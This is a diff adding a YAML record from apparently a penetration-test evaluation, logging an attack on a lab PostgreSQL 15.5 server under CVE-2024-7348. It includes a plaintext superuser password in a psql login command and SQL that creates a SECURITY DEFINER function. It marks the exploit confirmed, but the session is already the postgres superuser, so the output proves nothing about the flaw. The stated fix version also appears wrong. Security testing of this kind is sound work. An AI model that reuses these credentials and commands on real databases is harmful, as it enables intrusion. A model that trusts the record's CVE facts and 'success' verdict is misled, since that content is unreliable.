@@ -1,0 +1,40 @@
+# API (APP, 10.10.20.21) -> PostgreSQL (DATA, 10.10.30.31:5432, 15.5).
+# CVE-2024-7348 (CVSS 7.5 HIGH): PostgreSQL pg_dump TOCTOU race — an object creator
+# can register a SECURITY DEFINER function that executes arbitrary SQL as the user
+# running pg_dump, since pg_dump does not lock the schema between inspection and dump.
+# Confirmed: SECURITY DEFINER function created and executed → returns "postgres:postgres"
+# (runs as the function owner, not the caller). PostgreSQL 15.5 is in the vulnerable
+# range (fix = 15.6+).
+# Suricata 86601 (ET SCAN psql cross-zone APP->DATA).
+# Evidence: evaluation/pentest/evidence/s38_postgresql_secdef_toctou.txt
+id: S38-api-to-postgresql-secdef-toctou
+description: PostgreSQL 15.5 SECURITY DEFINER executes as function owner during pg_dump window (CVE-2024-7348 HIGH); api->postgresql, APP->DATA.
+start: 2026-11-16T20:03:28Z
+end: 2026-11-16T20:03:40Z
+attacker: api
+steps:
+  - step: 1
+    start: 2026-11-16T20:03:28Z
+    end: 2026-11-16T20:03:40Z
+    target: PostgreSQL
+    cve: CVE-2024-7348
+    technique: T1078.001
+    outcome: success
+    achieved: data_access
+    pivot: false
+    notes: |
+      PGPASSWORD=Passw0rd! psql -h 10.10.30.31 -U postgres
+        -> PostgreSQL 15.5 (Debian 15.5-1.pgdg120+1)
+      CREATE SCHEMA cve_7348_test;
+      CREATE FUNCTION cve_7348_test.get_data() RETURNS text LANGUAGE sql SECURITY DEFINER
+        AS $$ SELECT current_user || ':' || current_database() $$;
+        -> CREATE FUNCTION
+      SELECT cve_7348_test.get_data() AS security_definer_result;
+        -> security_definer_result = postgres:postgres
+      SELECT version() LIKE 'PostgreSQL 15.5%' AS vulnerable_pg_15_5;
+        -> t (true)
+      CVE-2024-7348: SECURITY DEFINER function runs as postgres owner, not the caller.
+      During pg_dump, the function can be swapped (TOCTOU) to execute arbitrary SQL.
+      Fix is PostgreSQL 15.6+; this instance is 15.5.
+      DROP SCHEMA cve_7348_test CASCADE; (cleaned up)
+      evidence s38_postgresql_secdef_toctou.txt
